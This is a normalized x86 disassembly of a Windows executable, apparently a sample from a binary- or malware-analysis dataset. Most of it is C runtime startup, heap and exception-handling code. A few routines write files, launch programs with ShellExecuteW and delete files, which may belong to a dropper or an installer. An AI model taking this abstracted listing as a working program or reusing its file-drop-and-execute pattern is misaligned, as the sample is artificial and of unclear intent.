cmp edi 0xffffffff
je r-xdata
xor al al
mov eax [ esi + 0x8 ]
mov ecx [ esi ]
push ebx
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
push edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov bl 0x1
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
pop edi
pop esi
pop ebx
sub_4044d7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ecx + 0x8 ]
jb r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x20 ]
mov ecx [ eax + 0x10 ]
xor eax eax
push eax
push eax
push ecx
push r--data
push eax
call [ ShellExecuteW@IAT ]
test eax eax
setne al
xor al al
jmp r-xdata
pop ebp
retn 0x4
sub_40450c
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
push 0x10
mov edi ecx
call sub_4046a3
mov esi eax
pop ecx
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x1c
call sub_401000
mov [ ebp - 0x4 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xe
call sub_401000
mov [ ebp - 0x8 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xa
call sub_401000
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0x8 ]
jb r-xdata
mov ecx [ edi + 0x4 ]
mov edi [ ecx + eax * 4 ]
push ebx
mov ebx [ GetProcessHeap@IAT ]
push 0x200
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov esi [ lstrcatW@IAT ]
push r--data
push eax
call esi
push [ edi + 0x10 ]
push [ ebp + 0x8 ]
call esi
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call esi
push [ edi + 0x20 ]
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push 0x0
call [ ShellExecuteW@IAT ]
push [ ebp + 0x8 ]
push 0x8
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
pop ebx
call ebx
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x4 ]
call sub_404a0e
push [ ebp - 0x8 ]
call sub_404a0e
push [ ebp - 0xc ]
call sub_404a0e
add esp 0xc
mov al 0x1
call ebx
push eax
call [ HeapFree@IAT ]
sub_404617
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ecx + 0x8 ]
jb r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
cmp [ eax + 0x19 ] 0x1
jne r-xdata
xor al al
jmp r-xdata
mov al 0x1
push [ eax + 0x10 ]
call [ DeleteFileW@IAT ]
test eax eax
je r-xdata
pop ebp
retn 0x4
sub_40465f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_404ecf
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404a0e
pop ecx
sub_4046a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_405060
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_405103
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_404f01
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_40512b
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_404e12
push sub_40b918
mov [ rw-data ] esi
call sub_405049
pop ecx
sub_404723
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_404778
mov edi edi
push esi
call sub_40572b
mov esi eax
push esi
call sub_4050f4
push esi
call sub_405591
push esi
call sub_405582
push esi
call sub_405573
push esi
call sub_40536e
push esi
call sub_40535d
add esp 0x18
pop esi
retn
sub_4047ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4047cf
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_405c76
push r--data
push r--data
call sub_4047ab
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_405d30
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_405c50
call sub_405049
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_405d30
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_404866
push 0x20
push r--data
call sub_405df0
push 0x8
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404991
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_405e35
retn
mov [ rw-data ] 0x1
push 0x8
call sub_405218
pop ecx
push [ ebp + 0x8 ]
call sub_40474e
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_40572b
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_40572b
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_404a19
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4061ee
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_405be1
test eax eax
je r-xdata
call sub_405be1
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_404a59
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405be1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b9f
pop ecx
mov [ esi ] eax
pop esi
sub_404acd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_404abd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404a0e
pop ecx
sub_404aee
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4066c9
add esp 0x14
pop ebp
retn
sub_404b0c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_404b95
push 0x58
push r--data
call sub_405df0
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_406270
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_405a24
test eax eax
jne r-xdata
push 0x1c
call sub_404b6c
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_405c2a
mov [ ebp - 0x4 ] esi
call sub_406d03
test eax eax
jns r-xdata
push 0x10
call sub_404b6c
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_406c6c
mov [ rw-data ] eax
call sub_406bb1
test eax eax
jns r-xdata
push 0x1b
call sub_4049f0
call sub_40693b
test eax eax
jns r-xdata
push 0x8
call sub_4049f0
push 0x1
call sub_4047cf
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_4049f0
call sub_4068dc
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_4049f0
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_4049d2
jmp r-xdata
push eax
call sub_4049a6
push ecx
push eax
push esi
push __dos_header
call sub_403966
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_405e35
retn
sub_404d0c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_406fe3
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_406fe3
pop ecx
sub_404e3c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_407050
lea esi [ eax + 0x1 ]
push esi
call sub_405060
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_406feb
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_404e9a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_404e7c
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_404e3c
jmp r-xdata
sub_404eda
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_404e7c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404a0e
pop ecx
sub_404f01
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_404e9a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404f26
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_4071ba
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40716c
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40716c
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_404fdc
mov edi edi
push esi
push 0x4
push 0x20
call sub_407120
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40500d
push 0xc
push r--data
call sub_405df0
call sub_404766
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_404f26
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405043
mov eax [ ebp - 0x1c ]
call sub_405e35
retn
sub_405060
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_405103
pop ecx
call sub_405be1
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_4061b5
push 0x1e
call sub_406006
push 0xff
call sub_40474e
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405be1
mov [ eax ] esi
push ebx
call sub_405103
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405be1
mov [ eax ] esi
sub_405103
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40512b
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_405177
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_4051c1
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_404a59
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40522f
push 0xc
push r--data
call sub_405df0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_4061b5
push 0x1e
call sub_406006
push 0xff
call sub_40474e
push 0x18
call sub_4070db
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405be1
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_405e35
retn
push edi
call sub_404a59
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_404a59
pop ecx
call sub_405be1
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4052e8
mov eax [ ebp - 0x1c ]
sub_4052f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40522f
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4049f0
sub_40538c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_4053d0
push 0x20
push r--data
call sub_405df0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_405862
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_405e35
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40538c
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4049bc
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4052f1
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40572b
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405537
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_4055a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_407580
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_406fe3
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_406fe3
pop ecx
sub_4056c9
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_4055a0
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4056ee
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4056c9
int3
pop ebp
jmp eax
sub_40573d
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_405771
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_4051c1
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_4057ae
push 0x8
push r--data
call sub_405df0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405850
push 0xc
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_4075fa
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405859
call sub_405e35
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_405862
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_40573d
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_407120
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_404a59
pop ecx
xor esi esi
push 0x0
push esi
call sub_4057ae
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4058f5
push 0x8
push r--data
call sub_405df0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405e35
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_404a59
pop ecx
push 0xd
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_404a59
